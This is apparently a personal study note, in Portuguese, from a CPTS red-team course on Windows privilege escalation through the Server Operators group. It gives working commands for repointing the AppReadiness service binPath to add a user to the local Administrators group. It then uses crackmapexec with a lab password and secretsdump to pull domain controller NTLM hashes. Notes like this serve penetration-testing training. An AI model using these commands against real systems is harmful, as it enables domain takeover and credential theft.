> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/server-operators.md).

# Server Operators

O grupo [Operadores de Servidor](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) permite que seus membros administrem servidores Windows sem a necessidade de privilégios de Administrador de Domínio.&#x20;

Trata-se de um grupo com privilégios muito elevados, capaz de acessar servidores localmente, incluindo Controladores de Domínio.

* **Consultando o serviço AppReadiness**

```ps
sc qc AppReadiness
```

* **Verificando permissões de serviço com o PsService**

```ps
c:\Tools\PsService.exe security AppReadiness
```

* **Verificando a participação no grupo de administradores locais**

```ps
net localgroup Administrators
```

* Vamos alterar o caminho do binário para executar um comando que adiciona nosso usuário atual ao grupo de administradores locais padrão.

```ps
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Iniciando o serviço**

* A inicialização do serviço falha, o que é esperado.

```ps
sc start AppReadiness
```

* Ao verificarmos a composição do grupo de administradores, constatamos que o comando foi executado com sucesso.

```
net localgroup Administrators
```

* A partir daqui, temos controle total sobre o Controlador de Domínio e podemos recuperar todas as credenciais do banco de dados NTDS, acessar outros sistemas e executar tarefas de pós-exploração.

```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

* **Recuperando hashes de senha NTLM do controlador de domínio**

```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
